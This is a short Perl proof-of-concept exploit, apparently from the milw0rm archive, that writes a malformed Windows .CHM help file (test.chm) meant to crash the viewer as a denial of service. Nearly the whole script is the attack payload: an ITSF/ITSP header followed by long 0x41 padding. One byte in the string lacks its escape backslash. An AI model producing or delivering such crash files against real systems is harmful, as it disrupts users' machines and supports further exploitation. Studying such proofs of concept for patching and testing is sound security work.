################################################################################################################################
#MS Windows .CHM Denial of Service (html compiled)
#
##########################################################################################################################################
#!/usr/bin/perl

use strict;

my $chm =
"\x49\x54\x53\x46\x03\x00\x00\x00\x60\x00\x00\x00\x01\x00\x00\x00\x2d\x83\xe7\x69\x09".
"\x18\x00\x00\x10\xfd\x01\x7c\xaa\x7b\xd0\x11\x9e\x0c\x00\xa0\xc9\x22\xe6\xec\x11".
"\xfd\x01\x7c\xaa\x7b\xd0\x11\x9e\x0c\x00\xa0\xc9\x22\xe6\xec\x60\x00\x00\x00\x00".
"\x00\x00\x00\x18\x00\x00\x00\x00\x00\x00\x00\x78\x00\x00\x00\x00\x00\x00\x00\x54".
"\x10\x00\x00\x00\x00\x00\x00\xcc\x10\x00\x00\x00\x00\x00\x00\xfe\x01\x00\x00\x00".
"\x00\x00\x00\xb8\x46\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x49".
"\x54\x53\x50\x01\x00\x00\x00\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41".
"\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41".
"\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41".
"\x41\x41\x41\x41x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41".
"\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41";
open(out, "> test.chm");
binmode(out);
print (out $chm);
close(out);

# milw0rm.com [2009-01-11]
